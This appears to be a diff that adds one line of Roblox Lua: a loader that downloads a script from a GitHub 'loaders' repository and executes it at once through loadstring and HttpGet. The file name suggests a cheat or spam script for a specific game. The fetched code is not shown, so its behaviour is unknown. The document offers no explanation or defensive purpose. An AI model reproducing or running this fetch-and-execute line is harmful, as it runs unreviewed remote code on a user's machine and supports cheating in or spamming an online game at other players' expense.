@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/a-long-flight-sandbox-spam6-3e6icz21o547nx.lua"))()
